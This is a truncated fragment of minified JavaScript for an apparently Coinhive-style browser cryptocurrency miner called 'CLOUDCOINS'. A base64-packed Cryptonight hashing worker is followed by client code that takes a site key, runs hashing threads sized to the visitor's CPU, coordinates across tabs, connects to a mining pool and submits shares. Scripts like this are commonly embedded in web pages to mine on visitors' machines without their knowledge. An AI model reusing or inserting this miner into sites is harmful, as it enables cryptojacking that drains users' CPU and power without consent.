bGVkUnVuIl0pIHJldHVybjsKCiAgICBmdW5jdGlvbiBkb1J1bigpIHsKICAgICAgICBpZihNb2R1bGVbImNhbGxlZFJ1biJdKSByZXR1cm47CiAgICAgICAgTW9kdWxlWyJjYWxsZWRSdW4iXSA9IHRydWU7CiAgICAgICAgaWYoQUJPUlQpIHJldHVybjsKICAgICAgICBlbnN1cmVJbml0UnVudGltZSgpOwogICAgICAgIHByZU1haW4oKTsKICAgICAgICBpZihNb2R1bGVbIm9uUnVudGltZUluaXRpYWxpemVkIl0pIE1vZHVsZVsib25SdW50aW1lSW5pdGlhbGl6ZWQiXSgpOwogICAgICAgIGlmKE1vZHVsZVsiX21haW4iXSAmJiBzaG91bGRSdW5Ob3cpIE1vZHVsZVsiY2FsbE1haW4iXShhcmdzKTsKICAgICAgICBwb3N0UnVuKCkKICAgIH0KCiAgICBpZihNb2R1bGVbInNldFN0YXR1cyJdKSB7CiAgICAgICAgTW9kdWxlWyJzZXRTdGF0dXMiXSgiUnVubmluZy4uLiIpOwogICAgICAgIHNldFRpbWVvdXQoKGZ1bmN0aW9uKCkgewogICAgICAgICAgICBzZXRUaW1lb3V0KChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIE1vZHVsZVsic2V0U3RhdHVzIl0oIiIpCiAgICAgICAgICAgIH0pLCAxKTsKICAgICAgICAgICAgZG9SdW4oKQogICAgICAgIH0pLCAxKQogICAgfSBlbHNlIHsKICAgICAgICBkb1J1bigpCiAgICB9Cn0KCk1vZHVsZVsicnVuIl0gPSBNb2R1bGUucnVuID0gcnVuOwoKZnVuY3Rpb24gZXhpdChzdGF0dXMsIGltcGxpY2l0KSB7CiAgICBpZihpbXBsaWNpdCAmJiBNb2R1bGVbIm5vRXhpdFJ1bnRpbWUiXSkgewogICAgICAgIHJldHVybgogICAgfQogICAgaWYoTW9kdWxlWyJub0V4aXRSdW50aW1lIl0pIHsKICAgIH0gZWxzZSB7CiAgICAgICAgQUJPUlQgPSB0cnVlOwogICAgICAgIEVYSVRTVEFUVVMgPSBzdGF0dXM7CiAgICAgICAgU1RBQ0tUT1AgPSBpbml0aWFsU3RhY2tUb3A7CiAgICAgICAgZXhpdFJ1bnRpbWUoKTsKICAgICAgICBpZihNb2R1bGVbIm9uRXhpdCJdKSBNb2R1bGVbIm9uRXhpdCJdKHN0YXR1cykKICAgIH0KICAgIGlmKEVOVklST05NRU5UX0lTX05PREUpIHsKICAgICAgICBwcm9jZXNzWyJleGl0Il0oc3RhdHVzKQogICAgfQogICAgTW9kdWxlWyJxdWl0Il0oc3RhdHVzLCBuZXcgRXhpdFN0YXR1cyhzdGF0dXMpKQp9CgpNb2R1bGVbImV4aXQiXSA9IE1vZHVsZS5leGl0ID0gZXhpdDsKdmFyIGFib3J0RGVjb3JhdG9ycyA9IFtdOwoKZnVuY3Rpb24gYWJvcnQod2hhdCkgewogICAgaWYoTW9kdWxlWyJvbkFib3J0Il0pIHsKICAgICAgICBNb2R1bGVbIm9uQWJvcnQiXSh3aGF0KQogICAgfQogICAgaWYod2hhdCAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgTW9kdWxlLnByaW50KHdoYXQpOwogICAgICAgIE1vZHVsZS5wcmludEVycih3aGF0KTsKICAgICAgICB3aGF0ID0gSlNPTi5zdHJpbmdpZnkod2hhdCkKICAgIH0gZWxzZSB7CiAgICAgICAgd2hhdCA9ICIiCiAgICB9CiAgICBBQk9SVCA9IHRydWU7CiAgICBFWElUU1RBVFVTID0gMTsKICAgIHZhciBleHRyYSA9ICJcbklmIHRoaXMgYWJvcnQoKSBpcyB1bmV4cGVjdGVkLCBidWlsZCB3aXRoIC1zIEFTU0VSVElPTlM9MSB3aGljaCBjYW4gZ2l2ZSBtb3JlIGluZm9ybWF0aW9uLiI7CiAgICB2YXIgb3V0cHV0ID0gImFib3J0KCIgKyB3aGF0ICsgIikgYXQgIiArIHN0YWNrVHJhY2UoKSArIGV4dHJhOwogICAgaWYoYWJvcnREZWNvcmF0b3JzKSB7CiAgICAgICAgYWJvcnREZWNvcmF0b3JzLmZvckVhY2goKGZ1bmN0aW9uKGRlY29yYXRvcikgewogICAgICAgICAgICBvdXRwdXQgPSBkZWNvcmF0b3Iob3V0cHV0LCB3aGF0KQogICAgICAgIH0pKQogICAgfQogICAgdGhyb3cgb3V0cHV0Cn0KCk1vZHVsZVsiYWJvcnQiXSA9IE1vZHVsZS5hYm9ydCA9IGFib3J0OwppZihNb2R1bGVbInByZUluaXQiXSkgewogICAgaWYodHlwZW9mIE1vZHVsZVsicHJlSW5pdCJdID09ICJmdW5jdGlvbiIpIE1vZHVsZVsicHJlSW5pdCJdID0gW01vZHVsZVsicHJlSW5pdCJdXTsKICAgIHdoaWxlKE1vZHVsZVsicHJlSW5pdCJdLmxlbmd0aCA+IDApIHsKICAgICAgICBNb2R1bGVbInByZUluaXQiXS5wb3AoKSgpCiAgICB9Cn0KdmFyIHNob3VsZFJ1bk5vdyA9IHRydWU7CmlmKE1vZHVsZVsibm9Jbml0aWFsUnVuIl0pIHsKICAgIHNob3VsZFJ1bk5vdyA9IGZhbHNlCn0KcnVuKCk7CnZhciBDcnlwdG9uaWdodFdBU01XcmFwcGVyID0gKGZ1bmN0aW9uKCkgewogICAgdGhpcy5jdHggPSBfY3J5cHRvbmlnaHRfY3JlYXRlKCk7CiAgICB0aGlzLnRocm90dGxlV2FpdCA9IDA7CiAgICB0aGlzLnRocm90dGxlZFN0YXJ0ID0gMDsKICAgIHRoaXMudGhyb3R0bGVkSGFzaGVzID0gMDsKICAgIHRoaXMuaGFzaGVzU2luY2VMYXN0U2hhcmUgPSAwOwogICAgdGhpcy53b3JrVGhyb3R0bGVkQm91bmQgPSB0aGlzLndvcmtUaHJvdHRsZWQuYmluZCh0aGlzKTsKICAgIHRoaXMuY3VycmVudEpvYiA9IG51bGw7CiAgICB0aGlzLnRhcmdldCA9IG5ldyBVaW50OEFycmF5KFsyNTUsIDI1NSwgMjU1LCAyNTUsIDI1NSwgMjU1LCAyNTUsIDI1NV0pOwogICAgdmFyIGhlYXAgPSBNb2R1bGUuSEVBUFU4LmJ1ZmZlcjsKICAgIHRoaXMuaW5wdXQgPSBuZXcgVWludDhBcnJheShoZWFwLCBNb2R1bGUuX21hbGxvYyg4NCksIDg0KTsKICAgIHRoaXMub3V0cHV0ID0gbmV3IFVpbnQ4QXJyYXkoaGVhcCwgTW9kdWxlLl9tYWxsb2MoMzIpLCAzMik7CiAgICBzZWxmLnBvc3RNZXNzYWdlKCJyZWFkeSIpOwogICAgc2VsZi5vbm1lc3NhZ2UgPSB0aGlzLm9uTWVzc2FnZS5iaW5kKHRoaXMpCn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5vbk1lc3NhZ2UgPSAoZnVuY3Rpb24obXNnKSB7CiAgICB2YXIgam9iID0gbXNnLmRhdGE7CiAgICBpZihqb2IudmVyaWZ5X2lkKSB7CiAgICAgICAgdGhpcy52ZXJpZnkoam9iKTsKICAgICAgICByZXR1cm4KICAgIH0KICAgIGlmKCF0aGlzLmN1cnJlbnRKb2IgfHwgdGhpcy5jdXJyZW50Sm9iLmpvYl9pZCAhPT0gam9iLmpvYl9pZCkgewogICAgICAgIHRoaXMuc2V0Sm9iKGpvYikKICAgIH0KICAgIGlmKGpvYi50aHJvdHRsZSkgewogICAgICAgIHRoaXMudGhyb3R0bGVXYWl0ID0gMSAvICgxIC0gam9iLnRocm90dGxlKSAtIDE7CiAgICAgICAgdGhpcy50aHJvdHRsZWRTdGFydCA9IHRoaXMubm93KCk7CiAgICAgICAgdGhpcy50aHJvdHRsZWRIYXNoZXMgPSAwOwogICAgICAgIHRoaXMud29ya1Rocm90dGxlZCgpCiAgICB9IGVsc2UgewogICAgICAgIHRoaXMud29yaygpCiAgICB9Cn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5kZXN0cm95ID0gKGZ1bmN0aW9uKCkgewogICAgX2NyeXB0b25pZ2h0X2Rlc3Ryb3kodGhpcy5jdHgpCn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5oZXhUb0J5dGVzID0gKGZ1bmN0aW9uKGhleCwgYnl0ZXMpIHsKICAgIHZhciBieXRlcyA9IG5ldyBVaW50OEFycmF5KGhleC5sZW5ndGggLyAyKTsKICAgIGZvcih2YXIgaSA9IDAsIGMgPSAwOyBjIDwgaGV4Lmxlbmd0aDsgYyArPSAyLCBpKyspIHsKICAgICAgICBieXRlc1tpXSA9IHBhcnNlSW50KGhleC5zdWJzdHIoYywgMiksIDE2KQogICAgfQogICAgcmV0dXJuIGJ5dGVzCn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5ieXRlc1RvSGV4ID0gKGZ1bmN0aW9uKGJ5dGVzKSB7CiAgICBmb3IodmFyIGhleCA9ICIiLCBpID0gMDsgaSA8IGJ5dGVzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgaGV4ICs9IChieXRlc1tpXSA+Pj4gNCkudG9TdHJpbmcoMTYpOwogICAgICAgIGhleCArPSAoYnl0ZXNbaV0gJiAxNSkudG9TdHJpbmcoMTYpCiAgICB9CiAgICByZXR1cm4gaGV4Cn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5tZWV0c1RhcmdldCA9IChmdW5jdGlvbihoYXNoLCB0YXJnZXQpIHsKICAgIGZvcih2YXIgaSA9IDA7IGkgPCB0YXJnZXQubGVuZ3RoOyBpKyspIHsKICAgICAgICB2YXIgaGkgPSBoYXNoLmxlbmd0aCAtIGkgLSAxLCB0aSA9IHRhcmdldC5sZW5ndGggLSBpIC0gMTsKICAgICAgICBpZihoYXNoW2hpXSA+IHRhcmdldFt0aV0pIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgfSBlbHNlIGlmKGhhc2hbaGldIDwgdGFyZ2V0W3RpXSkgewogICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiBmYWxzZQp9KTsKQ3J5cHRvbmlnaHRXQVNNV3JhcHBlci5wcm90b3R5cGUuc2V0Sm9iID0gKGZ1bmN0aW9uKGpvYikgewogICAgdGhpcy5jdXJyZW50Sm9iID0gam9iOwogICAgdGhpcy5oYXNoZXNTaW5jZUxhc3RTaGFyZSA9IDA7CiAgICB0aGlzLmJsb2IgPSB0aGlzLmhleFRvQnl0ZXMoam9iLmJsb2IpOwogICAgdGhpcy5pbnB1dC5zZXQodGhpcy5ibG9iKTsKICAgIHZhciB0YXJnZXQgPSB0aGlzLmhleFRvQnl0ZXMoam9iLnRhcmdldCk7CiAgICBpZih0YXJnZXQubGVuZ3RoIDw9IDgpIHsKICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgdGFyZ2V0Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIHRoaXMudGFyZ2V0W3RoaXMudGFyZ2V0Lmxlbmd0aCAtIGkgLSAxXSA9IHRhcmdldFt0YXJnZXQubGVuZ3RoIC0gaSAtIDFdCiAgICAgICAgfQogICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCB0aGlzLnRhcmdldC5sZW5ndGggLSB0YXJnZXQubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgdGhpcy50YXJnZXRbaV0gPSAyNTUKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIHRoaXMudGFyZ2V0ID0gdGFyZ2V0CiAgICB9Cn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5ub3cgPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gc2VsZi5wZXJmb3JtYW5jZSA/IHNlbGYucGVyZm9ybWFuY2Uubm93KCkgOiBEYXRlLm5vdygpCn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5oYXNoID0gKGZ1bmN0aW9uKGlucHV0LCBvdXRwdXQsIGxlbmd0aCkgewogICAgdmFyIG5vbmNlID0gTWF0aC5yYW5kb20oKSAqIDQyOTQ5NjcyOTUgKyAxID4+PiAwOwogICAgdGhpcy5pbnB1dFszOV0gPSAobm9uY2UgJiA0Mjc4MTkwMDgwKSA+PiAyNDsKICAgIHRoaXMuaW5wdXRbNDBdID0gKG5vbmNlICYgMTY3MTE2ODApID4+IDE2OwogICAgdGhpcy5pbnB1dFs0MV0gPSAobm9uY2UgJiA2NTI4MCkgPj4gODsKICAgIHRoaXMuaW5wdXRbNDJdID0gKG5vbmNlICYgMjU1KSA+PiAwOwogICAgX2NyeXB0b25pZ2h0X2hhc2godGhpcy5jdHgsIGlucHV0LmJ5dGVPZmZzZXQsIG91dHB1dC5ieXRlT2Zmc2V0LCBsZW5ndGgpCn0pOwpDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS52ZXJpZnkgPSAoZnVuY3Rpb24oam9iKSB7CiAgICB0aGlzLmJsb2IgPSB0aGlzLmhleFRvQnl0ZXMoam9iLmJsb2IpOwogICAgdGhpcy5pbnB1dC5zZXQodGhpcy5ibG9iKTsKICAgIGZvcih2YXIgaSA9IDAsIGMgPSAwOyBjIDwgam9iLm5vbmNlLmxlbmd0aDsgYyArPSAyLCBpKyspIHsKICAgICAgICB0aGlzLmlucHV0WzM5ICsgaV0gPSBwYXJzZUludChqb2Iubm9uY2Uuc3Vic3RyKGMsIDIpLCAxNikKICAgIH0KICAgIF9jcnlwdG9uaWdodF9oYXNoKHRoaXMuY3R4LCB0aGlzLmlucHV0LmJ5dGVPZmZzZXQsIHRoaXMub3V0cHV0LmJ5dGVPZmZzZXQsIHRoaXMuYmxvYi5sZW5ndGgpOwogICAgdmFyIHJlc3VsdCA9IHRoaXMuYnl0ZXNUb0hleCh0aGlzLm91dHB1dCk7CiAgICBzZWxmLnBvc3RNZXNzYWdlKHt2ZXJpZnlfaWQ6IGpvYi52ZXJpZnlfaWQsIHZlcmlmaWVkOiByZXN1bHQgPT09IGpvYi5yZXN1bHR9KQp9KTsKQ3J5cHRvbmlnaHRXQVNNV3JhcHBlci5wcm90b3R5cGUud29yayA9IChmdW5jdGlvbigpIHsKICAgIHZhciBoYXNoZXMgPSAwOwogICAgdmFyIG1lZXRzVGFyZ2V0ID0gZmFsc2U7CiAgICB2YXIgc3RhcnQgPSB0aGlzLm5vdygpOwogICAgdmFyIGVsYXBzZWQgPSAwOwogICAgZG8gewogICAgICAgIHRoaXMuaGFzaCh0aGlzLmlucHV0LCB0aGlzLm91dHB1dCwgdGhpcy5ibG9iLmxlbmd0aCk7CiAgICAgICAgaGFzaGVzKys7CiAgICAgICAgdGhpcy5oYXNoZXNTaW5jZUxhc3RTaGFyZSsrOwogICAgICAgIG1lZXRzVGFyZ2V0ID0gdGhpcy5tZWV0c1RhcmdldCh0aGlzLm91dHB1dCwgdGhpcy50YXJnZXQpOwogICAgICAgIGVsYXBzZWQgPSB0aGlzLm5vdygpIC0gc3RhcnQKICAgIH0gd2hpbGUoIW1lZXRzVGFyZ2V0ICYmIGVsYXBzZWQgPCAxZTMpOwogICAgdmFyIGhhc2hlc1BlclNlY29uZCA9IGhhc2hlcyAvIChlbGFwc2VkIC8gMWUzKTsKICAgIGlmKG1lZXRzVGFyZ2V0KSB7CiAgICAgICAgdmFyIG5vbmNlSGV4ID0gdGhpcy5ieXRlc1RvSGV4KHRoaXMuaW5wdXQuc3ViYXJyYXkoMzksIDQzKSk7CiAgICAgICAgdmFyIHJlc3VsdEhleCA9IHRoaXMuYnl0ZXNUb0hleCh0aGlzLm91dHB1dCk7CiAgICAgICAgdmFyIG1lc3NhZ2VfcGFyYW1zID0gewogICAgICAgICAgICBoYXNoZXNQZXJTZWNvbmQ6IGhhc2hlc1BlclNlY29uZCwKICAgICAgICAgICAgaGFzaGVzOiBoYXNoZXMsCiAgICAgICAgICAgIGpvYl9pZDogdGhpcy5jdXJyZW50Sm9iLmpvYl9pZCwKICAgICAgICAgICAgbm9uY2U6IG5vbmNlSGV4LAogICAgICAgICAgICByZXN1bHQ6IHJlc3VsdEhleCwKICAgICAgICAgICAgc2hhcmVfaGFzaGVzOiB0aGlzLmhhc2hlc1NpbmNlTGFzdFNoYXJlCiAgICAgICAgfTsKICAgICAgICB0aGlzLmhhc2hlc1NpbmNlTGFzdFNoYXJlID0gMDsKICAgICAgICAvL2NvbnNvbGUubG9nKCJtZXNzYWdlX3BhcmFtcyIsIG1lc3NhZ2VfcGFyYW1zKTsKICAgICAgICBzZWxmLnBvc3RNZXNzYWdlKG1lc3NhZ2VfcGFyYW1zKQogICAgfSBlbHNlIHsKICAgICAgICBzZWxmLnBvc3RNZXNzYWdlKHtoYXNoZXNQZXJTZWNvbmQ6IGhhc2hlc1BlclNlY29uZCwgaGFzaGVzOiBoYXNoZXN9KQogICAgfQp9KTsKQ3J5cHRvbmlnaHRXQVNNV3JhcHBlci5wcm90b3R5cGUud29ya1Rocm90dGxlZCA9IChmdW5jdGlvbigpIHsKICAgIHZhciBzdGFydCA9IHRoaXMubm93KCk7CiAgICB0aGlzLmhhc2godGhpcy5pbnB1dCwgdGhpcy5vdXRwdXQsIHRoaXMuYmxvYi5sZW5ndGgpOwogICAgdmFyIGVuZCA9IHRoaXMubm93KCk7CiAgICB2YXIgdGltZVBlckhhc2ggPSBlbmQgLSBzdGFydDsKICAgIHRoaXMudGhyb3R0bGVkSGFzaGVzKys7CiAgICB0aGlzLmhhc2hlc1NpbmNlTGFzdFNoYXJlKys7CiAgICB2YXIgZWxhcHNlZCA9IGVuZCAtIHRoaXMudGhyb3R0bGVkU3RhcnQ7CiAgICB2YXIgaGFzaGVzUGVyU2Vjb25kID0gdGhpcy50aHJvdHRsZWRIYXNoZXMgLyAoZWxhcHNlZCAvIDFlMyk7CiAgICBpZih0aGlzLm1lZXRzVGFyZ2V0KHRoaXMub3V0cHV0LCB0aGlzLnRhcmdldCkpIHsKICAgICAgICB2YXIgbm9uY2VIZXggPSB0aGlzLmJ5dGVzVG9IZXgodGhpcy5pbnB1dC5zdWJhcnJheSgzOSwgNDMpKTsKICAgICAgICB2YXIgcmVzdWx0SGV4ID0gdGhpcy5ieXRlc1RvSGV4KHRoaXMub3V0cHV0KTsKICAgICAgICB2YXIgbWVzc2FnZV9wYXJhbXMgPSB7CiAgICAgICAgICAgIGhhc2hlc1BlclNlY29uZDogaGFzaGVzUGVyU2Vjb25kLAogICAgICAgICAgICBoYXNoZXM6IHRoaXMudGhyb3R0bGVkSGFzaGVzLAogICAgICAgICAgICBqb2JfaWQ6IHRoaXMuY3VycmVudEpvYi5qb2JfaWQsCiAgICAgICAgICAgIG5vbmNlOiBub25jZUhleCwKICAgICAgICAgICAgcmVzdWx0OiByZXN1bHRIZXgsCiAgICAgICAgICAgIHNoYXJlX2hhc2hlczogdGhpcy5oYXNoZXNTaW5jZUxhc3RTaGFyZQogICAgICAgIH07CiAgICAgICAgdGhpcy5oYXNoZXNTaW5jZUxhc3RTaGFyZSA9IDA7CiAgICAgICAgY29uc29sZS5sb2coIm1lc3NhZ2VfcGFyYW1zIiwgbWVzc2FnZV9wYXJhbXMpOwogICAgICAgIHNlbGYucG9zdE1lc3NhZ2UobWVzc2FnZV9wYXJhbXMpOwogICAgICAgIHRoaXMudGhyb3R0bGVkSGFzaGVzID0gMAogICAgfSBlbHNlIGlmKGVsYXBzZWQgPiAxZTMpIHsKICAgICAgICBzZWxmLnBvc3RNZXNzYWdlKHtoYXNoZXNQZXJTZWNvbmQ6IGhhc2hlc1BlclNlY29uZCwgaGFzaGVzOiB0aGlzLnRocm90dGxlZEhhc2hlc30pOwogICAgICAgIHRoaXMudGhyb3R0bGVkSGFzaGVzID0gMAogICAgfSBlbHNlIHsKICAgICAgICB2YXIgd2FpdCA9IE1hdGgubWluKDJlMywgdGltZVBlckhhc2ggKiB0aGlzLnRocm90dGxlV2FpdCk7CiAgICAgICAgc2V0VGltZW91dCh0aGlzLndvcmtUaHJvdHRsZWRCb3VuZCwgd2FpdCkKICAgIH0KfSk7Ck1vZHVsZVsib25SdW50aW1lSW5pdGlhbGl6ZWQiXSA9IChmdW5jdGlvbigpIHsKICAgIHZhciBjcnlwdG9uaWdodCA9IG5ldyBDcnlwdG9uaWdodFdBU01XcmFwcGVyCn0pOwo=")])),function(I){"use strict";var g=function(g,C){if(this.params=C||{},this._siteKey=g,this._user=this.params.user||null,this._threads=[],this._hashes=0,this._currentJob=null,this._autoReconnect=!0,this._reconnectRetry=3,this._goal=0,this._totalHashesFromDeadThreads=0,this._throttle=Math.max(0,Math.min(.99,this.params.throttle||0)),this._stopOnInvalidOptIn=!1,this._waitingForAuth=!1,this._autoThreads={enabled:!!this.params.autoThreads,interval:null,adjustAt:null,adjustEvery:1e4,stats:{}},this._tab={ident:16777215*Math.random()|0,mode:CLOUDCOINS.IF_EXCLUSIVE_TAB,grace:0,waitReconnect:0,lastPingReceived:0,interval:null},I.BroadcastChannel)try{this._bc=new BroadcastChannel("cloudcoins"),this._bc.onmessage=function(I){"ping"===I.data&&(this._tab.lastPingReceived=Date.now())}.bind(this)}catch(I){}CLOUDCOINS.CONFIG.REQUIRES_AUTH&&(this._auth=new CLOUDCOINS.Auth(this._siteKey,{theme:this.params.theme||"light",lang:this.params.language||"auto"})),this._eventListeners={open:[],authed:[],close:[],error:[],job:[],found:[],accepted:[],optin:[]};var A=navigator.hardwareConcurrency||4;this._targetNumThreads=this.params.threads||A,this._useWASM=this.hasWASMSupport()&&!this.params.forceASMJS,this._asmjsStatus="unloaded",this._onTargetMetBound=this._onTargetMet.bind(this),this._onVerifiedBound=this._onVerified.bind(this)};g.prototype.start=function(g,C){if(this._tab.mode=g||CLOUDCOINS.IF_EXCLUSIVE_TAB,this._tab.interval&&(clearInterval(this._tab.interval),this._tab.interval=null),this._useWASM||"loaded"===this._asmjsStatus)this._startNow();else if("unloaded"===this._asmjsStatus){this._asmjsStatus="pending";var A=new XMLHttpRequest;A.addEventListener("load",function(){CLOUDCOINS.KNIGHT_WORKER=I.URL.createObjectURL(new Blob([A.responseText])),this._asmjsStatus="loaded",this._startNow()}.bind(this),A),A.open("get",CLOUDCOINS.CONFIG.LIB_URL+CLOUDCOINS.CONFIG.ASMJS_NAME,!0),A.send()}},g.prototype.stop=function(I){for(var g=0;g<this._threads.length;g++)this._totalHashesFromDeadThreads+=this._threads[g].hashesTotal,this._threads[g].stop();this._threads=[],this._autoReconnect=!1,this._currentJob=null,this._autoThreads.interval&&(clearInterval(this._autoThreads.interval),this._autoThreads.interval=null),this._tab.interval&&"dontKillTabUpdate"!==I&&(clearInterval(this._tab.interval),this._tab.interval=null)},g.prototype.getHashesPerSecond=function(){for(var I=0,g=0;g<this._threads.length;g++)I+=this._threads[g].hashesPerSecond;return I},g.prototype.getTotalHashes=function(I){for(var g=Date.now(),C=this._totalHashesFromDeadThreads,A=0;A<this._threads.length;A++){var Z=this._threads[A];C+=Z.hashesTotal,I&&(C+=(g-Z.lastMessageTimestamp)/1e3*.9*Z.hashesPerSecond)}return 0|C},g.prototype.getAcceptedHashes=function(){return this._hashes},g.prototype.on=function(I,g){this._eventListeners[I]&&this._eventListeners[I].push(g)},g.prototype.getAutoThreadsEnabled=function(I){return this._autoThreads.enabled},g.prototype.setAutoThreadsEnabled=function(I){this._autoThreads.enabled=!!I,!I&&this._autoThreads.interval&&(clearInterval(this._autoThreads.interval),this._autoThreads.interval=null),I&&!this._autoThreads.interval&&(this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery,this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3))},g.prototype.getThrottle=function(){return this._throttle},g.prototype.setThrottle=function(I){this._throttle=Math.max(0,Math.min(.99,I)),this._currentJob&&this._setJob(this._currentJob)},g.prototype.throttle=function(I){return I?this.setThrottle(I):this.getThrottle()},g.prototype.getNumThreads=function(){return this._targetNumThreads},g.prototype.setNumThreads=function(I){var I=Math.max(1,0|I);if(this._targetNumThreads=I,I>this._threads.length)for(var g=0;I>this._threads.length;g++){C=new CLOUDCOINS.JobThread;this._currentJob&&C.setJob(this._currentJob,this._onTargetMetBound),this._threads.push(C)}else if(I<this._threads.length)for(;I<this._threads.length;){var C=this._threads.pop();this._totalHashesFromDeadThreads+=C.hashesTotal,C.stop()}},g.prototype.threads=function(I){return I?this.setNumThreads(I):this.getNumThreads()},g.prototype.hasWASMSupport=function(){return void 0!==I.WebAssembly},g.prototype.isRunning=function(){return this._threads.length>0},g.prototype.isMobile=function(){return/mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)},g.prototype.didOptOut=function(I){if(!CLOUDCOINS.CONFIG.REQUIRES_AUTH)return!1;I=I||14400;var g=this._auth.getOptOutTime();return!!(g&&g>Date.now()/1e3-I)},g.prototype.selfTest=function(I){this.verifyThread||(this.verifyThread=new CLOUDCOINS.JobThread);var g={verify_id:"1",nonce:"204f150c",result:"6a9c7dea83b079ce0e012907dd6929bcb0aeec3c1f06c032ca7c3386432bca00",blob:"0606c6d8cfd005cad45b0306350a730b0354d52f1b6d671063824287ce4a82c971d109d56d1f1b00000000ee2d1d4fd7c18bdc1b24abb902ac8ecc3d201ffb5904de9e476a7bbb0f9ec1ab04"};this.verifyThread.verify(g,function(g){I(!0===g.verified)})},g.prototype._startNow=function(){this._tab.mode===CLOUDCOINS.FORCE_MULTI_TAB||this._tab.interval||(this._tab.interval=setInterval(this._updateTabs.bind(this),1e3)),this._tab.mode===CLOUDCOINS.IF_EXCLUSIVE_TAB&&this._otherTabRunning()||(this._tab.mode===CLOUDCOINS.FORCE_EXCLUSIVE_TAB&&(this._tab.grace=Date.now()+3e3),this.verifyThread||(this.verifyThread=new CLOUDCOINS.JobThread),this.setNumThreads(this._targetNumThreads),this._autoReconnect=!0,this._connect())},g.prototype._otherTabRunning=function(){if(this._tab.lastPingReceived>Date.now()-1500)return!0;try{var I=localStorage.getItem("cloudcoins");if(I){var g=JSON.parse(I);if(g.ident!==this._tab.ident&&Date.now()-g.time<1500)return!0}}catch(I){}return!1},g.prototype._updateTabs=function(){if(!(Date.now()<this._tab.waitReconnect)){var I=this._otherTabRunning();if(I&&this.isRunning()&&Date.now()>this._tab.grace?this.stop("dontKillTabUpdate"):I||this.isRunning()||this._startNow(),this.isRunning()&&!this._waitingForAuth){this._bc&&this._bc.postMessage("ping");try{localStorage.setItem("cloudcoins",JSON.stringify({ident:this._tab.ident,time:Date.now()}))}catch(I){}}}},g.prototype._adjustThreads=function(){var I=this.getHashesPerSecond(),g=this.getNumThreads(),C=this._autoThreads.stats;if(C[g]=C[g]?.5*C[g]+.5*I:I,Date.now()>this._autoThreads.adjustAt){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;var A=(C[g]||0)-1,Z=C[g+1]||0,b=C[g-1]||0;if(A>b&&(0===Z||Z>A)&&g<8)return this.setNumThreads(g+1);if(A>Z&&(!b||b>A)&&g>1)return this.setNumThreads(g-1)}},g.prototype._emit=function(I,g){var C=this._eventListeners[I];if(C&&C.length)for(var A=0;A<C.length;A++)C[A](g)},g.prototype._hashString=function(I){for(var g=5381,C=I.length;C;)g=33*g^I.charCodeAt(--C);return g>>>0},g.prototype._getLoginParams=function(){var I={id:this._id,site_key:this._siteKey,method:"anonymous",user:null,goal:0};return this._user?(I.method="user",I.user=this._user):this._goal&&(I.method="token",I.goal=this._goal),I},g.prototype._connect=function(){this._emit("open");var I=this;this._send("login",this._getLoginParams(),function(g){I._id=g.result&&g.result.id||g.id,I._hashes=0,I._emit("authed",g),I._reconnectRetry=3,I._tab.waitReconnect=0,I._setJob(g.result.job),I._emit("job",g.result.job),I._autoThreads.enabled&&!I._autoThreads.interval&&(I._autoThreads.adjustAt=Date.now()+I._autoThreads.adjustEvery,I._autoThreads.interval=setInterval(I._adjustThreads.bind(I),1e3))})},g.prototype._onNewJob=function(I,g){},g.prototype._onError=function(){for(var I=0;I<this._threads.length;I++)this._threads[I].stop();this._threads=[],this._emit("stopping",{error:!0}),this._autoReconnect&&setTimeout(this._startNow.bind(this),1e3*this._reconnectRetry)},g.prototype._onClose=function(I){I.code>=1003&&I.code<=1009&&(this._reconnectRetry=60,this._tab.waitReconnect=Date.now()+6e4);for(var g=0;g<this._threads.length;g++)this._threads[g].stop();this._threads=[],this._emit("close"),this._autoReconnect&&setTimeout(this._startNow.bind(this),1e3*this._reconnectRetry)},g.prototype._onMessage=function(I){var g=JSON.parse(I.data);g.type=g.type||g.method;g.result||g.params;"verify"===g.type&&this.verifyThread.verify(g.params,this._onVerifiedBound),("banned"===g.type||g.params&&g.params.banned)&&(this._emit("error",{banned:!0}),this._reconnectRetry=600,this._tab.waitReconnect=Date.now()+6e5)},g.prototype._setJob=function(I){I||console.log("TRIED TO SET JOB TO NULL"),this._currentJob=I,this._currentJob.throttle=this._throttle;for(var g=0;g<this._threads.length;g++)this._threads[g].setJob(I,this._onTargetMetBound)},g.prototype._onTargetMet=function(I){var g=this;if(this._emit("found",I),I.job_id===this._currentJob.job_id){var C=this.getTotalHashes();this._send("submit",{job_id:I.job_id,nonce:I.nonce,result:I.result,share_hashes:C-this.hashesSinceLastShare},function(I){"hash_accepted"===I.type&&(g._hashes=I.hashes||0,g._emit("accepted",I.result),g._goal&&this._hashes>=g._goal&&this.stop(),g._setJob(I.result.job))}),this.hashesSinceLastShare=C}},g.prototype._onVerified=function(I){this._send("verified",I)},g.prototype._send=function(I,g,C){var 